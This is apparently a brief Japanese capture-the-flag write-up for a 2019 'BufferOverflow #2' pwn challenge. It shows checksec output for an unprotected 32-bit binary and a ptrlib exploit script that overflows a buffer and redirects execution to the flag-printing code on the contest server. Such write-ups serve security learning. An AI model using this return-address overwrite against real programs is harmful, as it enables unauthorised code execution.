# [pwn 200pts] BufferOverflow #2 - Network Academia CTF 2019
32ビットバイナリで、全部無効です。
```
$ checksec -f bufover-2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   72 Symbols     No       0               6       bufover-2
```

win関数にflagを出力する処理がありますが、引数を設定しないといけません。面倒なのでフラグを出力する場所に直接ジャンプします。
```python
from ptrlib import *

elf = ELF("./bufover-2")
#sock = Process("./bufover-2")
sock = Socket("shell.2019.nactf.com", 31184)
payload = b'A' * 0x18
payload += p32(elf.section(".bss") + 0x300) # ebp
payload += p32(0x804921F)
sock.sendlineafter(">", payload)

sock.interactive()
```

# 感想
簡単ですね。